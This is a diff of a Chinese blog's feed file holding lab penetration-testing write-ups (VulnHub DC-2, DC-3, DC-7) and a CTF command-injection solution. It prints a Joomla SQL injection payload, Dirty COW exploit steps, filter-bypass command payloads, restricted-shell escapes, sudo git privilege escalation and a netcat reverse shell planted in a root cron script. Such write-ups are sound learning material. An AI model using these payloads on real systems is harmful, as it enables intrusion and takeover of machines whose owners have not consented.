-        <content type="html"><![CDATA[<p>渗透环境：DC3 <a href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫面存活主机"><a href="#扫面存活主机" class="headerlink" title="扫面存活主机"></a>扫面存活主机</h3><p>还是老规矩，nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure><p><img src="/2022/04/16/DC-3/1.png" alt="img"></p><p>发现目标主机为192.168.168.130</p><h3 id="扫描主机开放端口"><a href="#扫描主机开放端口" class="headerlink" title="扫描主机开放端口"></a>扫描主机开放端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p- 192.168.168.130</span><br></pre></td></tr></table></figure><p><img src="/2022/04/16/DC-3/2.png" alt="img"></p><p>开放了80端口，浏览器打开</p><p><img src="/2022/04/16/DC-3/cover.png" alt="img"></p><h3 id="收集其他信息"><a href="#收集其他信息" class="headerlink" title="收集其他信息"></a>收集其他信息</h3><p>查看cms情况</p><p><img src="/2022/04/16/DC-3/3.png" alt="img"></p><p>是joomia<br>用dirsearch看看目录情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.168.130/ -e *</span><br></pre></td></tr></table></figure><p><img src="/2022/04/16/DC-3/4.png" alt="img"></p><h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>存在管理员后台，看看</p><p><img src="/2022/04/16/DC-3/5.png" alt="img"></p><p>经测试单纯burp爆破不开来<br>这我百度joomla存在的漏洞，发现存在sql注入漏洞，测试是否存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://yourIP/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)</span><br></pre></td></tr></table></figure><p><img src="/2022/04/16/DC-3/6.png" alt="img"></p><p>确实是存在报错注入<br>上msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search joomla</span><br><span class="line">use 5</span><br><span class="line">options</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.168.130</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2022/04/16/DC-3/7.png" alt="img"></p><p>成功连上了</p><p><img src="/2022/04/16/DC-3/8.png" alt="img"></p><p>注：后来重做的时候发现在burp时其实已经找到密码了，不然这里用不了</p><p><img src="/2022/04/16/DC-3/9.png" alt="img"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>三连问身份</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure><p><img src="/2022/04/16/DC-3/10.png" alt="img"></p><p>上传权限漏洞探测脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload ./linux-exploit-suggester-master/linux-exploit-suggester.sh &gt; /tmp/les.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>给脚本加执行权限然后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">chmod</span> +x les.sh</span><br><span class="line">./les.sh</span><br></pre></td></tr></table></figure><p>发现脏牛</p><p><img src="/2022/04/16/DC-3/11.png" alt="img"></p><p>在www目录下下载脏牛提权脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/gbonacini/CVE-2016-5195.git</span><br><span class="line"><span class="built_in">cd</span> ./CVE-2016-5195                                                  </span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil //编译</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>                      //打开交互式环境        </span><br><span class="line">./dcow                                                              //执行</span><br></pre></td></tr></table></figure><p><img src="/2022/04/16/DC-3/12.png" alt="img"></p><p>OK！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo root</span><br><span class="line">dirtyCowfun</span><br><span class="line">cat /root/the-flag.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/04/16/DC-3/13.png" alt="img"></p><p>DC3 completed</p>]]></content>
-      
-      
+      <tags>
+        <tag>渗透</tag>
+        <tag>提权</tag>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-3</title>
+    <url>/2022/04/16/DC-3/</url>
+    <content><![CDATA[<p>渗透环境：DC3 <a href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫面存活主机"><a href="#扫面存活主机" class="headerlink" title="扫面存活主机"></a>扫面存活主机</h3><p>还是老规矩，nmap</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/1.png" alt="img"></p>
+<p>发现目标主机为192.168.168.130</p>
+<h3 id="扫描主机开放端口"><a href="#扫描主机开放端口" class="headerlink" title="扫描主机开放端口"></a>扫描主机开放端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -p- 192.168.168.130</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/2.png" alt="img"></p>
+<p>开放了80端口，浏览器打开</p>
+<p><img src="/2022/04/16/DC-3/cover.png" alt="img"></p>
+<h3 id="收集其他信息"><a href="#收集其他信息" class="headerlink" title="收集其他信息"></a>收集其他信息</h3><p>查看cms情况</p>
+<p><img src="/2022/04/16/DC-3/3.png" alt="img"></p>
+<p>是joomia<br>用dirsearch看看目录情况</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.168.130/ -e *</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/4.png" alt="img"></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>存在管理员后台，看看</p>
+<p><img src="/2022/04/16/DC-3/5.png" alt="img"></p>
+<p>经测试单纯burp爆破不开来<br>这我百度joomla存在的漏洞，发现存在sql注入漏洞，测试是否存在</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://yourIP/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/6.png" alt="img"></p>
+<p>确实是存在报错注入<br>上msf</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search joomla</span><br><span class="line">use 5</span><br><span class="line">options</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.168.130</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/7.png" alt="img"></p>
+<p>成功连上了</p>
+<p><img src="/2022/04/16/DC-3/8.png" alt="img"></p>
+<p>注：后来重做的时候发现在burp时其实已经找到密码了，不然这里用不了</p>
+<p><img src="/2022/04/16/DC-3/9.png" alt="img"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>三连问身份</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/10.png" alt="img"></p>
+<p>上传权限漏洞探测脚本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; upload ./linux-exploit-suggester-master/linux-exploit-suggester.sh &gt; /tmp/les.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>给脚本加执行权限然后执行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">chmod</span> +x les.sh</span><br><span class="line">./les.sh</span><br></pre></td></tr></table></figure>
+
+<p>发现脏牛</p>
+<p><img src="/2022/04/16/DC-3/11.png" alt="img"></p>
+<p>在www目录下下载脏牛提权脚本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/gbonacini/CVE-2016-5195.git</span><br><span class="line"><span class="built_in">cd</span> ./CVE-2016-5195                                                  </span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil //编译</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>                      //打开交互式环境        </span><br><span class="line">./dcow                                                              //执行</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/12.png" alt="img"></p>
+<p>OK！</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo root</span><br><span class="line">dirtyCowfun</span><br><span class="line">cat /root/the-flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/13.png" alt="img"></p>
+<p>DC3 completed</p>
+]]></content>
       <categories>
-          
-          <category> 实践 </category>
-          
+        <category>实践</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> 渗透 </tag>
-            
-            <tag> 提权 </tag>
-            
-            <tag> msf </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>竞赛课-babytrick</title>
-      <link href="/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/"/>
-      <url>/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/</url>
-      
-        <content type="html"><![CDATA[<p>看看源码是什么先</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">your</span> <span class="title">baby</span> <span class="title">trick</span> <span class="title">bypass</span> <span class="title">me</span> &lt;?<span class="title">php</span></span><br><span class="line">    <span class="title">echo</span> &quot;<span class="title">use</span> <span class="title">your</span> <span class="title">baby</span> <span class="title">trick</span> <span class="title">bypass</span> <span class="title">me</span>&quot;;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_error&quot;</span>, <span class="literal">false</span>); </span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line">    <span class="variable">$str</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;O_O&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;O_O&#x27;</span>]:<span class="string">&#x27;O_O&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&quot;O_O&quot;</span>) !==<span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;O_O, baby&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="variable">$str</span>&lt;<span class="number">9999999999</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;too small&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ((<span class="keyword">string</span>)<span class="variable">$str</span>&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;too big&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$num</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])?<span class="variable">$_GET</span> [<span class="string">&#x27;num&#x27;</span>]:<span class="string">&#x27;num&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no num&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$num</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span> :</span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;secret.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span> :</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;2333333&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> too small</span><br></pre></td></tr></table></figure><p>好！先是一个_的问题，这里直接用空格或者是%0a就能替换掉，这样第一个就过了。<br>其次就是一个数字大小判断的问题，这里用数组进行绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?O O[]=9999999999</span><br></pre></td></tr></table></figure><p>num的要求是2，但不能是数字</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=2a</span><br></pre></td></tr></table></figure><p>f12查看源码，发现多了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">    <span class="string">&quot;my secret is in f35cdaa4e8672a43e73aee7c2dd51731, try to get it&quot;</span>;</span><br><span class="line">?</span><br></pre></td></tr></table></figure><p>访问f35cdaa4e8672a43e73aee7c2dd51731.php</p><p><img src="/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/1.png" alt="img"></p><p>绕过问题<br>看看有什么</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p><img src="/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/2.png" alt="img"></p><p>抓个当前的php看看先，这里过滤了cat，php，我们用tac</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="built_in">tac</span><span class="variable">$&#123;IFS&#125;</span>f35cdaa4e8672a43e73aee7c2dd51731.p<span class="string">&quot;&quot;</span>hp</span><br></pre></td></tr></table></figure><p>这样就ok啦，整理下返回的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^.*php.*$|^.*echo.*$|^.*cat.*$|^.*busybox.*$|[A-Z0-9a-z].*&gt;[A-Za-z0-9]|[A-Z0-9a-z].*&gt;&gt;[A-Za-z0-9]|[A-Z0-9a-z].*&gt;&amp;[A-Za-z0-9]|^.*rm.*$/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123; <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概就是这个样子了<br>构造我们的payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%0als /</span><br><span class="line">?cmd=%0atac /flag</span><br></pre></td></tr></table></figure><p>这样就能拿到flag了</p><p><img src="/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/3.png" alt="img"></p>]]></content>
-      
-      
+      <tags>
+        <tag>渗透</tag>
+        <tag>提权</tag>
+        <tag>msf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-7</title>
+    <url>/2022/04/29/DC-7/</url>
+    <content><![CDATA[<p>渗透环境DC-7：<a href="https://www.vulnhub.com/entry/dc-7,356/">https://www.vulnhub.com/entry/dc-7,356/</a><br>攻击机：192.168.168.128<br>靶机：192.168.168.135</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br><span class="line">nmap -sS -p- 192.168.168.135</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/29/DC-7/1.png" alt="img"></p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>目标开启了22，80端口，先是访问80端口<br>cms为drupal<br>这里看到一个登录框</p>
+<p><img src="/2022/04/29/DC-7/2.png" alt="img"></p>
+<p>对admin进行弱命令爆破，失败<br>主页有这么的一个提示</p>
+<p><img src="/2022/04/29/DC-7/3.png" alt="img"></p>
+<p>突破口不在当前box中，我是想不到了，后来看别人的wp可算是明白了，原来突破口是这个</p>
+<p><img src="/2022/04/29/DC-7/4.png" alt="img"></p>
+<p>百度这个内容，可以找到一个github账号</p>
+<p><img src="/2022/04/29/DC-7/5.png" alt="img"></p>
+<p>看看有什么可用信息，在config.php文件中看到了账号密码</p>
+<p><img src="/2022/04/29/DC-7/6.png" alt="img"></p>
+<p>这个账号不是后台的，是主机的登录账号和密码，用xshell连接</p>
+<p>登录后看到有new mail</p>
+<p><img src="/2022/04/29/DC-7/7.png" alt="img"></p>
+<p>看看mbox的内容</p>
+<p>我们可以看到每隔一段时间，就会由root执行 &#x2F;opt&#x2F;scripts&#x2F;backups.sh</p>
+<p><img src="/2022/04/29/DC-7/8.png" alt="img"></p>
+<p>看看能不能往那个文件有什么内容，写点东西进去</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="drush修改密码"><a href="#drush修改密码" class="headerlink" title="drush修改密码"></a>drush修改密码</h3><p><img src="/2022/04/29/DC-7/9.png" alt="img"></p>
+<p>这里看到有drush和gpg命令<br>gpg主要是用来进行数字签名的操作<br>drush发现可以修改账号的密码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/29/DC-7/10.png" alt="img"></p>
+<p>这能是root用户和www-data进行修改<br>显示改后台admin的密码看看</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line">drush user-password admin --password=<span class="string">&quot;test&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/29/DC-7/11.png" alt="img"></p>
+<p>后台登录</p>
+<p><img src="/2022/04/29/DC-7/12.png" alt="img"></p>
+<h3 id="存在可利用插件"><a href="#存在可利用插件" class="headerlink" title="存在可利用插件"></a>存在可利用插件</h3><p>这里可以添加模板，我们添加php模板，这样我们就可以发布php模板的帖子<br>下载地址：<a href="https://www.drupal.org/project/php">https://www.drupal.org/project/php</a></p>
+<p><img src="/2022/04/29/DC-7/13.png" alt="img"></p>
+<p>安装完后勾选php</p>
+<p><img src="/2022/04/29/DC-7/14.png" alt="img"></p>
+<p>content-&gt;add content-&gt;basic page<br>写入一句话木马，蚁剑连接</p>
+<p><img src="/2022/04/29/DC-7/15.png" alt="img"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>往&#x2F;opt&#x2F;scripts&#x2F;backups.sh写入</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 192.168.168.128 1111 -e /bin/bash </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/29/DC-7/16.png" alt="img"></p>
+<p>在kali上执行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp 1111</span><br></pre></td></tr></table></figure>
+
+<p>等待一段时间后就会上线了</p>
+<p><img src="/2022/04/29/DC-7/17.png" alt="img"></p>
+<p>获得flag</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">心得：这次的这个社工操作是真的没想到欸，也算是一次体验吧</span><br></pre></td></tr></table></figure>
+]]></content>
       <categories>
-          
-          <category> 实践 </category>
-          
+        <category>实践</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> CTF </tag>
-            
-            <tag> 绕过 </tag>
-            
-            <tag> 命令执行 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>DC-2</title>
-      <link href="/2022/04/15/DC-2/"/>
-      <url>/2022/04/15/DC-2/</url>
-      
-        <content type="html"><![CDATA[<p>渗透环境: DC-2  <a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a><br>攻击机：192.168.168.128<br>靶机：靶机：ip地址未知, 已知ip与攻击机在同一网段下</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><h3 id="使用nmap扫描存活的主机"><a href="#使用nmap扫描存活的主机" class="headerlink" title="使用nmap扫描存活的主机"></a>使用nmap扫描存活的主机</h3><p>老规矩上nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-2/1.png" alt="img"></p><p>发现靶机IP为192.168.168.129</p><h3 id="扫描目标主机对外开放的端口"><a href="#扫描目标主机对外开放的端口" class="headerlink" title="扫描目标主机对外开放的端口"></a>扫描目标主机对外开放的端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sS -p- 192.168.168.129</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-2/2.png" alt="img"></p><p>发现开启了端口80<br>还有一个7744，这啥端口啊，对着这个端口再扫一次</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 7744 192.168.168.129</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-2/2.6.png" alt="img"></p><p>原来是ssh呢，先不管吧<br>浏览192.168.168.129:80</p><p><img src="/2022/04/15/DC-2/2.5.png" alt="img"></p><p>发现flag1</p><p><img src="/2022/04/15/DC-2/3.png" alt="img"></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>查看cms是什么</p><p><img src="/2022/04/15/DC-2/4.png" alt="img"></p><p>好家伙是wordpress，而且还是4.7的<br>用dirsearch看看目录下有什么</p><p><img src="/2022/04/15/DC-2/5.png" alt="img"></p><h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>进入后台吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dc-2/wp-login.php?redirect_to=http%3A%2F%2F192.168.168.129%2Fwp-admin%2F&amp;reauth=1</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-2/6.png" alt="img"></p><p>经典登录框<br>既然是WordPress，那就用wpscan看看有什么用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wpscan --url http://dc-2/ –enumerate u </span><br></pre></td></tr></table></figure><p>发现以下三个user</p><p><img src="/2022/04/15/DC-2/7.png" alt="img"></p><p>放到burp上进行爆破看看，结果失败了，看来原字典中没有匹配的。<br>flag1中有说到cewl，那就用cewl生成字典再试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2/ &gt; dc-2.txt</span><br></pre></td></tr></table></figure><p>用生成的dc-2.txt作为字典再跑一次（集束炸弹）</p><p><img src="/2022/04/15/DC-2/8.png" alt="img"></p><p>登录看看</p><p><img src="/2022/04/15/DC-2/9.png" alt="img"></p><p>flag2 get</p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>这里让我们找其他突破口，看了这个wordpress没用了<br>试着上传，结果跟我说路径创不了，好吧</p><p>回到之前收集到的7744端口，这就是其他突破口，ssh远程连接<br>这里我用xshell连接</p><p><img src="/2022/04/15/DC-2/10.png" alt="img"></p><p>配好后用刚刚得到的两串账号密码登录看看行不行<br>我用tom的是可以的<br>进去后发现不能用很多命令，存在命令受限问题<br>ls ，vi 能用。<br>ls，发现当前目录存在flag3.txt，用vi查看</p><p><img src="/2022/04/15/DC-2/11.png" alt="img"></p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>我这里用了vi绕过受限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br><span class="line">:<span class="built_in">set</span> shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p>发现能用cd了<br>看看有什么敏感目录吧<br>最后在&#x2F;home&#x2F;jerryx下发现flag4.txt</p><p><img src="/2022/04/15/DC-2/12.png" alt="img"></p><h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>git提权是吧<br>结果发现git不给用，还是得解决命令受限问题<br>最后找到了这种，rbash绕过<br>参考(<a href="https://xz.aliyun.com/t/7642#toc-3">https://xz.aliyun.com/t/7642#toc-3</a>)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span></span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-2/13.png" alt="img"></p><p>这里我们要改两个地方，其中是PATH与SHELL</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin/:/usr/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> SHELL=/bin/sh</span><br></pre></td></tr></table></figure><p>这样我们就能用其他命令了<br>发现tom不是sudoer，那就切成jerry</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p <span class="built_in">help</span></span><br><span class="line">:!/bin/bash</span><br></pre></td></tr></table></figure><p>提权成功<br>查看&#x2F;root<br>发现最后的flag</p><p><img 